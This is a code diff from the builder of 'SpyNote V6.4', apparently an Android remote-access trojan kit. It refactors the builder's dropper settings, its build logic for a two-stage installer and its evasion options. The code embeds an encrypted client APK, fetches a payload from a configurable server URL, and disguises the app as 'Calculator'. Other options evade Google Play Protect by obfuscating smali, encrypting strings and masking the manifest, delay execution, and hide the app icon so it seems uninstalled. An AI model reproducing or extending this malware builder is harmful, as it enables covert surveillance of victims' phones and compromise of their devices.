@@ -10,7 +10,7 @@ Imports SpyNote_V6._4.SN
 Imports SpyNote_V6._4.SN.SpyNote.Stores
 Imports System.Xml
 
-Public Class Build
+Partial Public Class Build
     Private sGet As String
     Private colo As Color
     Private colo1 As Color
@@ -182,10 +182,8 @@ Public Class Build
 
         ' Загружаем настройки защиты и Dropper
         LoadProtectionSettings()
-        InitializeProtectionExtras()
         LoadProtectionUiExtras()
-        ' Ensure Dropper tab and controls are created before loading its settings
-        InitializeDropperTab()
+        RefreshStealthControlsState()
         LoadDropperSettings()
         LoadSettings()
         If Me.cbNotifyType.SelectedIndex = -1 AndAlso Me.cbNotifyType.Items.Count > 0 Then
@@ -195,147 +193,47 @@ Public Class Build
     End Sub
 
     ' -----  DROPPER  -----
-    Private Sub InitializeDropperTab()
-        ' Создаём вкладку, если её нет
-        If Not ThemeTabControl1.TabPages.ContainsKey("TabPage7") Then
-            Dim tabPage As New TabPage()
-            tabPage.Name = "TabPage7"
-            tabPage.Text = "Dropper"
-            tabPage.BackColor = Color.FromArgb(45, 45, 48)
-            tabPage.Size = New Size(404, 353)
-
-            ' Группа Dropper
-            Dim grpDropper As New GroupBox()
-            grpDropper.Name = "grpDropper_Dropper"
-            grpDropper.Text = "Dropper Settings"
-            grpDropper.Location = New Point(10, 10)
-            grpDropper.Size = New Size(380, 200)
-            grpDropper.ForeColor = Color.FromArgb(241, 241, 241)
-
-            ' Чекбокс включения
-            Dim chkDropperMode As New CheckBox()
-            chkDropperMode.Name = "chkDropperMode_Dropper"
-            chkDropperMode.Text = "Enable Dropper Mode (two-stage installation)"
-            chkDropperMode.Location = New Point(10, 20)
-            chkDropperMode.Size = New Size(300, 20)
-            chkDropperMode.ForeColor = Color.FromArgb(241, 241, 241)
-            chkDropperMode.BackColor = Color.FromArgb(45, 45, 48)
-            AddHandler chkDropperMode.CheckedChanged, AddressOf Me.chkDropperMode_CheckedChanged
-
-            ' Метка
-            Dim lblTemplate As New Label()
-            lblTemplate.Text = "Template APK path:"
-            lblTemplate.Location = New Point(10, 55)
-            lblTemplate.Size = New Size(120, 20)
-            lblTemplate.ForeColor = Color.FromArgb(241, 241, 241)
-
-            ' Поле пути
-            Dim txtTemplatePath As New TextBox()
-            txtTemplatePath.Name = "txtDropperTemplatePath"
-            txtTemplatePath.Location = New Point(130, 52)
-            txtTemplatePath.Size = New Size(160, 23)
-            txtTemplatePath.BackColor = Color.FromArgb(37, 37, 38)
-            txtTemplatePath.ForeColor = Color.FromArgb(241, 241, 241)
-            txtTemplatePath.BorderStyle = BorderStyle.FixedSingle
-
-            ' Кнопка Browse
-            Dim btnBrowseTemplate As New Button()
-            btnBrowseTemplate.Text = "Browse"
-            btnBrowseTemplate.Location = New Point(300, 50)
-            btnBrowseTemplate.Size = New Size(70, 25)
-            btnBrowseTemplate.BackColor = Color.FromArgb(53, 53, 60)
-            btnBrowseTemplate.ForeColor = Color.FromArgb(241, 241, 241)
-            AddHandler btnBrowseTemplate.Click, AddressOf Me.BrowseTemplate_Click
-
-            Dim lblPayloadUrl As New Label()
-            lblPayloadUrl.Text = "Payload URL (HTTP):"
-            lblPayloadUrl.Location = New Point(10, 95)
-            lblPayloadUrl.Size = New Size(120, 20)
-            lblPayloadUrl.ForeColor = Color.FromArgb(241, 241, 241)
-
-            Dim txtPayloadUrl As New TextBox()
-            txtPayloadUrl.Name = "txtPayloadUrl"
-            txtPayloadUrl.Location = New Point(130, 92)
-            txtPayloadUrl.Size = New Size(240, 23)
-            txtPayloadUrl.BackColor = Color.FromArgb(37, 37, 38)
-            txtPayloadUrl.ForeColor = Color.FromArgb(241, 241, 241)
-            txtPayloadUrl.BorderStyle = BorderStyle.FixedSingle
-            txtPayloadUrl.Text = "https://your-server.com/client.apk"
-
-            grpDropper.Controls.Add(chkDropperMode)
-            grpDropper.Controls.Add(lblTemplate)
-            grpDropper.Controls.Add(txtTemplatePath)
-            grpDropper.Controls.Add(btnBrowseTemplate)
-            grpDropper.Controls.Add(lblPayloadUrl)
-            grpDropper.Controls.Add(txtPayloadUrl)
-
-            ' Добавляем группу на вкладку
-            tabPage.Controls.Add(grpDropper)
-
-            ' Добавляем вкладку в TabControl
-            ThemeTabControl1.TabPages.Add(tabPage)
-        End If
-    End Sub
-
-    ' Helper to safely get the Dropper GroupBox from TabPage7
     Private Function GetDropperGroupBox() As GroupBox
-        Try
-            Dim tp = If(ThemeTabControl1.TabPages.ContainsKey("TabPage7"), ThemeTabControl1.TabPages("TabPage7"), Nothing)
-            If tp Is Nothing Then Return Nothing
-            ' Prefer named control
-            For Each c As Control In tp.Controls
-                If TypeOf c Is GroupBox AndAlso c.Name = "grpDropper_Dropper" Then
-                    Return DirectCast(c, GroupBox)
-                End If
-            Next
-            ' Fallback to first GroupBox
-            For Each c As Control In tp.Controls
-                If TypeOf c Is GroupBox Then
-                    Return DirectCast(c, GroupBox)
-                End If
-            Next
-        Catch
-        End Try
-        Return Nothing
+        Return grpDropper_Dropper
     End Function
 
-    ' ----- Обработчики для Dropper -----
-    Private Sub BrowseTemplate_Click(sender As Object, e As EventArgs)
+    Private Function IsDropperEnabled() As Boolean
+        Return chkDropperMode_Dropper IsNot Nothing AndAlso chkDropperMode_Dropper.Checked
+    End Function
+
+    Private Sub SetDropperChildControlsEnabled(grp As GroupBox, enabled As Boolean)
+        If grp Is Nothing Then Return
+        For Each ctrl As Control In grp.Controls
+            If ctrl.Name = "chkDropperMode_Dropper" Then Continue For
+            ctrl.Enabled = enabled
+        Next
+    End Sub
+
+    Private Sub BrowseTemplate_Click(sender As Object, e As EventArgs) Handles btnBrowseDropperTemplate.Click
         Using ofd As New OpenFileDialog()
             ofd.Filter = "APK files (*.apk)|*.apk|All files (*.*)|*.*"
             ofd.Title = "Select Dropper Template APK"
             If ofd.ShowDialog() = DialogResult.OK Then
-                ' Find the txtTemplatePath inside Dropper group safely
-                Dim grp = GetDropperGroupBox()
-                If grp IsNot Nothing Then
-                    Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
-                    If txt IsNot Nothing Then
-                        txt.Text = ofd.FileName
-                        SaveDropperSettings()
-                    End If
-                End If
+                txtDropperTemplatePath.Text = ofd.FileName
+                SaveDropperSettings()
             End If
         End Using
     End Sub
 
-    Private Sub chkDropperMode_CheckedChanged(sender As Object, e As EventArgs)
-        Dim chk As CheckBox = TryCast(sender, CheckBox)
-        If chk Is Nothing Then Return
-        Dim grp As GroupBox = GetDropperGroupBox()
-        If grp IsNot Nothing Then
-            grp.Enabled = chk.Checked
-            SaveDropperSettings()
-        End If
+    Private Sub chkDropperMode_CheckedChanged(sender As Object, e As EventArgs) Handles chkDropperMode_Dropper.CheckedChanged
+        SetDropperChildControlsEnabled(grpDropper_Dropper, chkDropperMode_Dropper.Checked)
+        SaveDropperSettings()
     End Sub
 
     Private Sub SaveDropperSettings()
         Try
-            Dim grp As GroupBox = GetDropperGroupBox()
-            If grp Is Nothing Then Return
-            Dim chk As CheckBox = TryCast(grp.Controls("chkDropperMode_Dropper"), CheckBox)
-            Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
-            If chk IsNot Nothing Then My.Settings("DropperMode") = chk.Checked.ToString()
-            If txt IsNot Nothing Then My.Settings("TemplatePath") = txt.Text
+            My.Settings("DropperMode") = IsDropperEnabled().ToString()
+            My.Settings("TemplatePath") = txtDropperTemplatePath.Text
+            My.Settings("PayloadUrl") = txtPayloadUrl.Text
+            If cbDropperStyle.SelectedItem IsNot Nothing Then
+                My.Settings("DropperStyle") = cbDropperStyle.SelectedItem.ToString()
+            End If
+            My.Settings("EmbedPayload") = chkEmbedPayload.Checked.ToString()
             My.Settings.Save()
         Catch
         End Try
@@ -343,354 +241,106 @@ Public Class Build
 
     Private Sub LoadDropperSettings()
         Try
-            Dim grp As GroupBox = GetDropperGroupBox()
-            If grp Is Nothing Then Return
-            Dim chk As CheckBox = TryCast(grp.Controls("chkDropperMode_Dropper"), CheckBox)
-            Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
-            If chk IsNot Nothing Then
-                chk.Checked = Convert.ToBoolean(If(My.Settings("DropperMode") IsNot Nothing, My.Settings("DropperMode").ToString(), "False"))
+            Dim enabled As Boolean = Convert.ToBoolean(If(My.Settings("DropperMode") IsNot Nothing, My.Settings("DropperMode").ToString(), "False"))
+            chkDropperMode_Dropper.Checked = enabled
+
+            If My.Settings("TemplatePath") IsNot Nothing Then
+                txtDropperTemplatePath.Text = My.Settings("TemplatePath").ToString()
             End If
-            If txt IsNot Nothing AndAlso My.Settings("TemplatePath") IsNot Nothing Then
-                txt.Text = My.Settings("TemplatePath").ToString()
+            If My.Settings("PayloadUrl") IsNot Nothing Then
+                txtPayloadUrl.Text = My.Settings("PayloadUrl").ToString()
             End If
-            If chk IsNot Nothing AndAlso grp IsNot Nothing Then grp.Enabled = chk.Checked
+            If My.Settings("DropperStyle") IsNot Nothing Then
+                Dim idx As Integer = cbDropperStyle.Items.IndexOf(My.Settings("DropperStyle").ToString())
+                If idx >= 0 Then cbDropperStyle.SelectedIndex = idx
+            ElseIf cbDropperStyle.Items.Count > 0 AndAlso cbDropperStyle.SelectedIndex = -1 Then
+                cbDropperStyle.SelectedIndex = 0
+            End If
+            chkEmbedPayload.Checked = Convert.ToBoolean(If(My.Settings("EmbedPayload") IsNot Nothing, My.Settings("EmbedPayload").ToString(), "True"))
+            SetDropperChildControlsEnabled(grpDropper_Dropper, enabled)
         Catch
         End Try
     End Sub
 
-    ' ----- Логика сборки Dropper (вставляется в ThemeButton2_Click) -----
-    Private Sub BuildDropper(packageName As String, aesKey As Byte(), appName As String, iconPath As String)
-        Try
-            ' 1. Получаем путь к шаблону
-            Dim grp As GroupBox = GetDropperGroupBox()
-            If grp Is Nothing Then
-                MessageBox.Show("Dropper controls not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-                Return
-            End If
-            Dim txtTemplate As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
-            Dim templatePath As String = If(txtTemplate IsNot Nothing, txtTemplate.Text, String.Empty)
-            If String.IsNullOrEmpty(templatePath) OrElse Not File.Exists(templatePath) Then
-                ' Пытаемся взять встроенный шаблон
-                templatePath = Path.Combine(Store.Resources(1), "Dropper", "DropperTemplate.apk")
-                If Not File.Exists(templatePath) Then
-                    MessageBox.Show("Dropper template APK not found! Please specify a valid template.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-                    Return
-                End If
-            End If
-
-            ' 2. Путь к client.apk
-            Dim clientApkPath As String = ApkNotifyPatcher.GetBuildingClientApkPath()
-            If Not File.Exists(clientApkPath) Then
-                clientApkPath = Path.Combine(Store.Resources(1), "Imports", "Payload", "client.apk")
-            End If
-            If Not File.Exists(clientApkPath) Then
-                MessageBox.Show("Client APK not found! Build client first.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-                Return
-            End If
-
-            Dim publishDir As String = Path.Combine(ApkNotifyPatcher.GetDriveRoot(), "Building-6.1", "apktool", "out", "publish")
-            Directory.CreateDirectory(publishDir)
-            Dim publishedApk As String = Path.Combine(publishDir, "client.apk")
-            File.Copy(clientApkPath, publishedApk, True)
-
-            Dim txtUrl As TextBox = TryCast(grp.Controls("txtPayloadUrl"), TextBox)
-            Dim payloadUrl As String = If(txtUrl IsNot Nothing, txtUrl.Text.Trim(), String.Empty)
-            If String.IsNullOrWhiteSpace(payloadUrl) Then
-                payloadUrl = "file:///" & publishedApk.Replace("\"c, "/"c)
-            End If
-
-            ' 3. Читаем APK bytes для fallback (payload.enc)
-            Dim apkBytes As Byte() = File.ReadAllBytes(clientApkPath)
-            Dim encryptedApk As Byte() = EncryptPayload(apkBytes, aesKey)
-
-            ' 5. Работаем с шаблонным APK
-            Dim workDir As String = Path.Combine(Store.Resources(1), "Dropper", "Work")
-            Directory.CreateDirectory(workDir)
-            Dim outputApkPath As String = Path.Combine(workDir, "output.apk")
-            File.Copy(templatePath, outputApkPath, True)
-
-            Using zip As ZipFile = ZipFile.Read(outputApkPath)
-                ' Заменяем AndroidManifest.xml (бинарный, но мы попробуем)
-                ReplaceManifest(zip, packageName, appName, iconPath)
-
-                ' Заменяем иконку
-                ReplaceIcon(zip, iconPath)
-
-                ' Добавляем зашифрованный DEX в папку assets
-                zip.AddEntry("assets/payload_url.txt", Encoding.UTF8.GetBytes(payloadUrl))
-                zip.AddEntry("assets/app_mask.txt", Encoding.UTF8.GetBytes(If(String.IsNullOrWhiteSpace(appName), "Calculator", appName)))
-                zip.AddEntry("assets/payload.enc", encryptedApk)
-
-                zip.Save()
-            End Using
-
-            ' 6. Подписываем APK
-            Dim keystorePath As String = Path.Combine(Store.Resources(1), "Dropper", "test.keystore")
-            If Not File.Exists(keystorePath) Then
-                GenerateTestKeystore(keystorePath)
-            End If
-            SignApk(outputApkPath, keystorePath)
-
-            ' 7. Копируем готовый Dropper в финальную папку
-            Dim finalApkPath As String = Path.Combine(Store.Resources(1), "Dropper", "Dropper_final.apk")
-            File.Copy(outputApkPath, finalApkPath, True)
-
-            MessageBox.Show("Dropper APK created:" & vbCrLf & finalApkPath & vbCrLf & vbCrLf &
-                            "Publish client.apk at:" & vbCrLf & publishedApk & vbCrLf & vbCrLf &
-                            "Payload URL:" & vbCrLf & payloadUrl,
-                            "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
-        Catch ex As Exception
-            MessageBox.Show("Dropper build error: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
-    End Sub
-
-    ' ----- Вспомогательные методы для Dropper -----
-    Private Function ExtractDexFromApk(apkPath As String) As Byte()
-        Try
-            Using zip As ZipFile = ZipFile.Read(apkPath)
-                Dim dexEntry As ZipEntry = zip("classes.dex")
-                If dexEntry IsNot Nothing Then
-                    Using ms As New MemoryStream()
-                        dexEntry.Extract(ms)
-                        Return ms.ToArray()
-                    End Using
-                End If
-            End Using
-        Catch
-        End Try
-        Return Nothing
+    Private Function GetDropperConfigFromUi(packageName As String, aesKey As Byte(), appName As String, iconPath As String) As ApkDropperPatcher.DropperBuildConfig
+        Dim cfg As New ApkDropperPatcher.DropperBuildConfig()
+        cfg.ClientPackageName = packageName
+        cfg.AesKey = aesKey
+        cfg.PayloadAppName = appName
+        cfg.IconPath = iconPath
+        cfg.UseEncryptedFallback = True
+        cfg.EmbedPayload = chkEmbedPayload.Checked
+        If cbDropperStyle.SelectedItem IsNot Nothing Then cfg.Style = cbDropperStyle.SelectedItem.ToString()
+        cfg.TemplateApkPath = txtDropperTemplatePath.Text.Trim()
+        cfg.PayloadUrl = txtPayloadUrl.Text.Trim()
+        Return cfg
     End Function
 
-    Private Sub ReplaceManifest(zip As ZipFile, packageName As String, appName As String, iconPath As String)
-        ' Пытаемся найти AndroidManifest.xml (может быть бинарным, но попробуем)
-        Dim manifestEntry As ZipEntry = zip("AndroidManifest.xml")
-        If manifestEntry Is Nothing Then
-            manifestEntry = zip.FirstOrDefault(Function(e) e.FileName.EndsWith("AndroidManifest.xml"))
+    Private Function BuildDropperApk(packageName As String, aesKey As Byte(), appName As String, iconPath As String, ByRef report As ApkDropperPatcher.DropperBuildReport) As Boolean
+        Dim cfg = GetDropperConfigFromUi(packageName, aesKey, appName, iconPath)
+        Return ApkDropperPatcher.TryBuildDropper(Store.Resources(1), cfg, report)
+    End Function
+
+    Private Sub StyleProtectionCheckBox(chk As CheckBox, active As Boolean)
+        If chk Is Nothing Then Return
+        chk.UseVisualStyleBackColor = False
+        chk.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
+    End Sub
+
+    Private Sub StyleProtectionLabel(lbl As Label, active As Boolean)
+        If lbl Is Nothing Then Return
+        lbl.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
+    End Sub
+
+    Private Sub StyleProtectionNumeric(num As NumericUpDown, active As Boolean)
+        If num Is Nothing Then Return
+        num.ForeColor = If(active, UiTheme.TextPrimary, UiTheme.TextMuted)
+    End Sub
+
+    Private Sub RefreshStealthControlsState()
+        Dim stealthOn As Boolean = chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked
+        StyleProtectionCheckBox(chkStealthEnabled, True)
+        If chkObfuscateSmali IsNot Nothing Then
+            chkObfuscateSmali.Enabled = stealthOn
+            StyleProtectionCheckBox(chkObfuscateSmali, stealthOn)
         End If
-        If manifestEntry IsNot Nothing Then
-            Using ms As New MemoryStream()
-                manifestEntry.Extract(ms)
-                ms.Position = 0
-                ' Пытаемся прочитать как XML (если бинарный – не получится)
-                Try
-                    Dim xmlDoc As New XmlDocument()
-                    xmlDoc.Load(ms)
-                    Dim root As XmlElement = xmlDoc.DocumentElement
-                    If root IsNot Nothing Then
-                        ' package
-                        If root.HasAttribute("package") Then
-                            root.SetAttribute("package", packageName)
-                        End If
-                        ' android:label
-                        Dim labelAttr As XmlAttribute = root.Attributes("android:label")
-                        If labelAttr Is Nothing Then
-                            labelAttr = xmlDoc.CreateAttribute("android:label", "http://schemas.android.com/apk/res/android")
-                            root.Attributes.Append(labelAttr)
-                        End If
-                        labelAttr.Value = appName
-                        ' android:icon
-                        Dim iconAttr As XmlAttribute = root.Attributes("android:icon")
-                        If iconAttr Is Nothing Then
-                            iconAttr = xmlDoc.CreateAttribute("android:icon", "http://schemas.android.com/apk/res/android")
-                            root.Attributes.Append(iconAttr)
-                        End If
-                        iconAttr.Value = "@drawable/ic_launcher"
-                    End If
-                    Using outMs As New MemoryStream()
-                        xmlDoc.Save(outMs)
-                        outMs.Position = 0
-                        zip.UpdateEntry("AndroidManifest.xml", outMs.ToArray())
-                    End Using
-                Catch
-                    ' Если не XML, значит бинарный – не трогаем
-                End Try
-            End Using
+        If chkEncryptStrings IsNot Nothing Then
+            chkEncryptStrings.Enabled = stealthOn
+            StyleProtectionCheckBox(chkEncryptStrings, stealthOn)
         End If
-    End Sub
-
-    Private Sub ReplaceIcon(zip As ZipFile, iconPath As String)
-        If Not String.IsNullOrEmpty(iconPath) AndAlso File.Exists(iconPath) Then
-            Dim iconBytes As Byte() = File.ReadAllBytes(iconPath)
-            ' Ищем все иконки по маске
-            Dim entries = zip.Where(Function(e) e.FileName.Contains("ic_launcher") AndAlso e.FileName.EndsWith(".png"))
-            For Each e As ZipEntry In entries
-                zip.UpdateEntry(e.FileName, iconBytes)
-            Next
+        If chkMaskManifest IsNot Nothing Then
+            chkMaskManifest.Enabled = stealthOn
+            StyleProtectionCheckBox(chkMaskManifest, stealthOn)
         End If
+        If chkDelayedExecution IsNot Nothing Then
+            chkDelayedExecution.Enabled = stealthOn
+            StyleProtectionCheckBox(chkDelayedExecution, stealthOn)
+        End If
+        Dim delayActive As Boolean = stealthOn AndAlso chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked
+        If numDelayMinutes IsNot Nothing Then
+            numDelayMinutes.Enabled = delayActive
+            StyleProtectionNumeric(numDelayMinutes, delayActive)
+        End If
+        StyleProtectionLabel(lblDelayOptions, stealthOn)
     End Sub
 
-    Private Sub GenerateTestKeystore(keystorePath As String)
-        Dim dir As String = Path.GetDirectoryName(keystorePath)
-        Directory.CreateDirectory(dir)
-        Dim psi As New ProcessStartInfo()
-        psi.FileName = "keytool"
-        psi.Arguments = $"-genkey -v -keystore ""{keystorePath}"" -alias test -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname ""CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"""
-        psi.UseShellExecute = False
-        psi.CreateNoWindow = True
-        psi.RedirectStandardOutput = True
-        psi.RedirectStandardError = True
-        Using p As Process = Process.Start(psi)
-            p.WaitForExit()
-        End Using
-    End Sub
-
-    Private Sub SignApk(apkPath As String, keystorePath As String)
-        Try
-            Dim psi As New ProcessStartInfo()
-            psi.FileName = "jarsigner"
-            psi.Arguments = $"-verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ""{keystorePath}"" -storepass 123456 -keypass 123456 ""{apkPath}"" test"
-            psi.UseShellExecute = False
-            psi.CreateNoWindow = True
-            psi.RedirectStandardOutput = True
-            psi.RedirectStandardError = True
-            Using p As Process = Process.Start(psi)
-                p.WaitForExit()
-            End Using
-        Catch ex As Exception
-            MessageBox.Show("Signing failed: " & ex.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-        End Try
-    End Sub
-
-    Private chkHideIconAfterSetup As CheckBox
-    Private chkStealthEnabled As CheckBox
-    Private chkObfuscateSmali As CheckBox
-    Private chkEncryptStrings As CheckBox
-    Private chkMaskManifest As CheckBox
-    Private chkDelayedExecution As CheckBox
-    Private numDelayMinutes As NumericUpDown
-
-    Private Sub InitializeProtectionExtras()
-        Try
-            If grpProtectionOptions Is Nothing Then Return
-            If grpProtectionOptions.Controls("chkStealthEnabled") IsNot Nothing Then Return
-
-            If grpProtectionOptions.Controls("chkHideIconAfterSetup") Is Nothing Then
-                chkHideIconAfterSetup = New CheckBox()
-                chkHideIconAfterSetup.Name = "chkHideIconAfterSetup"
-                chkHideIconAfterSetup.AutoSize = True
-                chkHideIconAfterSetup.Text = "Hide icon after permissions (looks like uninstall)"
-                chkHideIconAfterSetup.Location = New Point(20, 220)
-                chkHideIconAfterSetup.Size = New Size(360, 18)
-                chkHideIconAfterSetup.ForeColor = Color.FromArgb(241, 241, 241)
-                chkHideIconAfterSetup.BackColor = Color.FromArgb(45, 45, 48)
-                chkHideIconAfterSetup.Checked = False
-                grpProtectionOptions.Controls.Add(chkHideIconAfterSetup)
-            End If
-
-            Dim y As Integer = 248
-
-            chkStealthEnabled = New CheckBox()
-            chkStealthEnabled.Name = "chkStealthEnabled"
-            chkStealthEnabled.Text = "Play Protect stealth (obfuscate + encrypt + mask)"
-            chkStealthEnabled.Location = New Point(20, y)
-            chkStealthEnabled.AutoSize = True
-            chkStealthEnabled.ForeColor = Color.FromArgb(241, 241, 241)
-            chkStealthEnabled.Checked = False
-            AddHandler chkStealthEnabled.CheckedChanged, AddressOf StealthEnabled_CheckedChanged
-            grpProtectionOptions.Controls.Add(chkStealthEnabled)
-            y += 22
-
-            chkObfuscateSmali = New CheckBox()
-            chkObfuscateSmali.Name = "chkObfuscateSmali"
-            chkObfuscateSmali.Text = "Obfuscate smali (org/spynote -> a/b/C)"
-            chkObfuscateSmali.Location = New Point(35, y)
-            chkObfuscateSmali.AutoSize = True
-            chkObfuscateSmali.ForeColor = Color.FromArgb(241, 241, 241)
-            chkObfuscateSmali.Checked = False
-            chkObfuscateSmali.Enabled = False
-            grpProtectionOptions.Controls.Add(chkObfuscateSmali)
-            y += 20
-
-            chkEncryptStrings = New CheckBox()
-            chkEncryptStrings.Name = "chkEncryptStrings"
-            chkEncryptStrings.Text = "Encrypt strings (XOR + dynamic key)"
-            chkEncryptStrings.Location = New Point(35, y)
-            chkEncryptStrings.AutoSize = True
-            chkEncryptStrings.ForeColor = Color.FromArgb(241, 241, 241)
-            chkEncryptStrings.Checked = False
-            chkEncryptStrings.Enabled = False
-            grpProtectionOptions.Controls.Add(chkEncryptStrings)
-            y += 20
-
-            chkMaskManifest = New CheckBox()
-            chkMaskManifest.Name = "chkMaskManifest"
-            chkMaskManifest.Text = "Mask AndroidManifest (support.v7 aliases)"
-            chkMaskManifest.Location = New Point(35, y)
-            chkMaskManifest.AutoSize = True
-            chkMaskManifest.ForeColor = Color.FromArgb(241, 241, 241)
-            chkMaskManifest.Checked = False
-            chkMaskManifest.Enabled = False
-            grpProtectionOptions.Controls.Add(chkMaskManifest)
-            y += 22
-
-            chkDelayedExecution = New CheckBox()
-            chkDelayedExecution.Name = "chkDelayedExecution"
-            chkDelayedExecution.Text = "Delayed execution (optional)"
-            chkDelayedExecution.Location = New Point(20, y)
-            chkDelayedExecution.AutoSize = True
-            chkDelayedExecution.ForeColor = Color.FromArgb(241, 241, 241)
-            chkDelayedExecution.Checked = False
-            chkDelayedExecution.Enabled = False
-            grpProtectionOptions.Controls.Add(chkDelayedExecution)
-            y += 22
-
-            Dim lblDelay As New Label()
-            lblDelay.Text = "Delay min / screen toggles / battery:"
-            lblDelay.Location = New Point(35, y)
-            lblDelay.AutoSize = True
-            lblDelay.ForeColor = Color.FromArgb(241, 241, 241)
-            lblDelay.Enabled = False
-            lblDelay.Name = "lblDelayOptions"
-            grpProtectionOptions.Controls.Add(lblDelay)
-            y += 18
-
-            numDelayMinutes = New NumericUpDown()
-            numDelayMinutes.Name = "numDelayMinutes"
-            numDelayMinutes.Location = New Point(35, y)
-            numDelayMinutes.Size = New Size(60, 23)
-            numDelayMinutes.Minimum = 0
-            numDelayMinutes.Maximum = 1440
-            numDelayMinutes.Value = 5
-            numDelayMinutes.Enabled = False
-            grpProtectionOptions.Controls.Add(numDelayMinutes)
-
-            grpProtectionOptions.Size = New Size(420, y + 45)
-            StealthEnabled_CheckedChanged(Nothing, EventArgs.Empty)
-        Catch
-        End Try
-    End Sub
-
-    Private Sub StealthEnabled_CheckedChanged(sender As Object, e As EventArgs)
-        Dim enabled As Boolean = chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked
-        If chkObfuscateSmali IsNot Nothing Then chkObfuscateSmali.Enabled = enabled
-        If chkEncryptStrings IsNot Nothing Then chkEncryptStrings.Enabled = enabled
-        If chkMaskManifest IsNot Nothing Then chkMaskManifest.Enabled = enabled
-        If chkDelayedExecution IsNot Nothing Then chkDelayedExecution.Enabled = enabled
-        If numDelayMinutes IsNot Nothing Then numDelayMinutes.Enabled = enabled AndAlso chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked
-        Try
-            Dim lbl = grpProtectionOptions?.Controls("lblDelayOptions")
-            If TypeOf lbl Is Label Then DirectCast(lbl, Label).Enabled = enabled
-        Catch
-        End Try
+    Private Sub StealthEnabled_CheckedChanged(sender As Object, e As EventArgs) Handles chkStealthEnabled.CheckedChanged, chkDelayedExecution.CheckedChanged
+        RefreshStealthControlsState()
     End Sub
 
     Private Function GetStealthCheckbox(name As String) As Boolean
-        Try
-            Dim ctrl = grpProtectionOptions?.Controls(name)
-            If TypeOf ctrl Is CheckBox Then Return DirectCast(ctrl, CheckBox).Checked
-        Catch
-        End Try
-        Return False
+        Select Case name
+            Case "chkStealthEnabled" : Return chkStealthEnabled.Checked
+            Case "chkObfuscateSmali" : Return chkObfuscateSmali.Checked
+            Case "chkEncryptStrings" : Return chkEncryptStrings.Checked
+            Case "chkMaskManifest" : Return chkMaskManifest.Checked
+            Case "chkDelayedExecution" : Return chkDelayedExecution.Checked
+            Case Else : Return False
+        End Select
     End Function
 
     Private Function GetHideIconAfterSetupChecked() As Boolean
-        Try
-            If chkHideIconAfterSetup IsNot Nothing Then Return chkHideIconAfterSetup.Checked
-            Dim ctrl = grpProtectionOptions?.Controls("chkHideIconAfterSetup")
-            If TypeOf ctrl Is CheckBox Then Return DirectCast(ctrl, CheckBox).Checked
-        Catch
-        End Try
-        Return False
+        Return chkHideIconAfterSetup IsNot Nothing AndAlso chkHideIconAfterSetup.Checked
     End Function
 
     Private Function BuildPermissionFlags() As String
@@ -743,22 +393,33 @@ Public Class Build
         }
     End Function
 
-    Private Sub RunSlExeAndWait(slExe As String)
-        Dim psi As New ProcessStartInfo(slExe, " n -160")
-        psi.WorkingDirectory = Path.GetDirectoryName(slExe)
-        psi.WindowStyle = ProcessWindowStyle.Hidden
-        psi.UseShellExecute = False
-        psi.CreateNoWindow = True
-        Using p As Process = Process.Start(psi)
-            If Not p.WaitForExit(180000) Then
-                Try
-                    p.Kill()
-                Catch
-                End Try
-                MessageBox.Show("SL.exe build timed out after 3 minutes.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-            End If
-        End Using
-    End Sub
+    Private Function RunSlExeAndWait(slExe As String) As Boolean
+        Try
+            Dim psi As New ProcessStartInfo(slExe, " n -160")
+            psi.WorkingDirectory = Path.GetDirectoryName(slExe)
+            psi.WindowStyle = ProcessWindowStyle.Hidden
+            psi.UseShellExecute = False
+            psi.CreateNoWindow = True
+            Using p As Process = Process.Start(psi)
+                If Not p.WaitForExit(180000) Then
+                    Try
+                        p.Kill()
+                    Catch
+                    End Try
+                    MessageBox.Show("SL.exe build timed out after 3 minutes.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                    Return False
+                End If
+                If p.ExitCode <> 0 Then
+                    MessageBox.Show("SL.exe exited with code " & p.ExitCode.ToString() & ". Check Payload\s.inf and Java/apktool in Building-6.1.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                    Return False
+                End If
+            End Using
+            Return True
+        Catch ex As Exception
+            MessageBox.Show("SL.exe failed: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Return False
+        End Try
+    End Function
 
     Private Function FormatBuildIssue(raw As String) As String
         If String.IsNullOrWhiteSpace(raw) Then Return "Unknown build error"
@@ -785,20 +446,29 @@ Public Class Build
         Return text
     End Function
 
-    Private Sub ApplyApkNotifyPatch(notifyCfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, resourcesPath As String)
+    Private Sub ApplyApkNotifyPatch(notifyCfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, resourcesPath As String, packageName As String, aesKey As Byte(), appName As String, iconPath As String)
         Dim patchErrors As New List(Of String)
-        Dim distApkPath As String = ApkNotifyPatcher.GetBuildingDistApkPath()
-        Dim clientApkPath As String = ApkNotifyPatcher.GetBuildingClientApkPath()
+        Dim distApkPath As String = ApkNotifyPatcher.WaitForDistApk(resourcesPath)
+        distApkPath = ApkNotifyPatcher.NormalizeDistApkPath(resourcesPath)
